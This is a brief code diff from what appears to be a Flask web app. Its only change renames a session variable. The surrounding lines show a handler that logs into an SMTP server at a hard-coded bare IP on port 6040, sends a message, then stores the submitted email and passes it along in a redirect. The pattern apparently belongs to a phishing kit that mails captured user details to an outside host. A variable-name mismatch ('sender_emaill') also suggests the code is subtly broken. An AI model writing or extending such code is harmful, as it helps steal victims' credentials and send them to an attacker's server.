@@ -207,7 +207,7 @@ def second():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        session['eman'] = email  # Save email as session variable
+        session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
 
 
